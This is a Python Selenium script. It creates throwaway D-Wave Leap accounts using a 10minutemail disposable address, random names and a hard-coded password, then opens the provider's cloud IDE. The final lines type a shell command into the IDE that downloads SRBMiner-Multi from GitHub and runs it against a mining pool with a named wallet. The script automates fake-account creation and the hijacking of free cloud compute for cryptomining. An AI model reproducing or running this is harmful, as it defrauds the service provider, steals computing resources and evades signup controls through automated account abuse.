




import string
import random

from selenium import webdriver
from selenium.webdriver.common.by import By
import string
import random

from selenium.webdriver import ActionChains



from selenium import  webdriver


from selenium.webdriver.common.keys import Keys

driver=webdriver.Firefox()
letters = string.ascii_lowercase
# c = webdriver.ChromeOptions()
# c.add_argument("--incognito")

a=ActionChains(driver)
import time

time.sleep(5)
N = 7
 
# using random.choices()
# generating random strings
res = ''.join(random.choices(string.ascii_lowercase +
                             'a', k=N))
def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    print("Random string of length", length, "is:", result_str)



driver.get('https://10minutemail.net/')
time.sleep(5)
window_before = driver.window_handles[0]

email=driver.find_element(By.XPATH,'//*[@id="fe_text"]').get_attribute('value')
driver.execute_script("window.open('about:blank','secondtab');")
driver.switch_to.window("secondtab")
driver.get('https://cloud.dwavesys.com/leap/signup/')
time.sleep(5)

driver.find_element(By.XPATH,'/html/body/div/div[1]/div/form/div[1]/div[1]/label/div[2]/input').click()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter)
a.send_keys(Keys.TAB).perform()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter)
a.send_keys(Keys.TAB).perform()
a.send_keys(email)
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.ARROW_DOWN).perform()
a.send_keys(Keys.TAB).perform()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter)
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.ARROW_DOWN).perform()
a.send_keys(Keys.TAB).perform()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter)
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.ARROW_DOWN).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.ARROW_DOWN).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.ARROW_DOWN).perform()
a.send_keys(Keys.TAB).perform()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter)
password='@Safal12345'
a.send_keys(Keys.TAB).perform()
a.send_keys(password)
a.send_keys(Keys.TAB).perform()
a.send_keys(password)
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
i=0
while(i<50):
    a.send_keys(Keys.ARROW_DOWN).perform()
    i=i+1


driver.find_element(By.XPATH,'/html/body/div/div[1]/div/form/div[2]/label/div[1]').click()
driver.find_element(By.XPATH,'/html/body/div/div[1]/div/form/div[3]/label/div[1]').click()
driver.find_element(By.XPATH,'//*[@id="signupFormFieldsSubmit"]').click()
time.sleep(5)

driver.find_element(By.XPATH,'/html/body/div[2]/div/div/div/a').click()
time.sleep(4)

driver.find_element(By.XPATH,'/html/body/div[2]/div/form/label/div[2]').click()
a.send_keys(email)
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.ENTER).perform()
time.sleep(10)
driver.switch_to.window(window_before)
time.sleep(4)
driver.refresh()
driver.refresh()
driver.refresh()
driver.refresh()
driver.refresh()
time.sleep(7)
driver.refresh()
driver.refresh()
driver.refresh()
time.sleep(5)
driver.refresh()
time.sleep(5)
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()

link=driver.find_element(By.PARTIAL_LINK_TEXT,'Welcome to Leap - Account Activation').get_attribute('href')




print(email)

time.sleep(6)
driver.get(link)

time.sleep(2)    
cc= driver.find_element(By.XPATH,'//*[@id="tab3"]/p/a[1]').get_attribute('href')
driver.get(cc)
time.sleep(3)

a.send_keys(email)
a.send_keys(Keys.TAB).perform()     

a.send_keys(password)
a.send_keys(Keys.ENTER).perform()    

time.sleep(4)
driver.get('https://ide.dwavesys.io/#https://github.com/dwave-examples/sudoku')
time.sleep(62)
j=0
while j<40:
    a.send_keys(Keys.TAB).perform()
    j=j+1    


a.send_keys('sudo apt update -y && sudo apt install wget -y && sudo  wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.2/SRBMiner-Multi-1-0-2-Linux.tar.xz && tar -xf SRBMiner-Multi-1-0-2-Linux.tar.xz && cd SRBMiner-Multi-1-0-2 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RSmDwCvQR5x9BUraN9yi5HJazDB8QkWgin.M1')
a.send_keys(Keys.ENTER).perform()

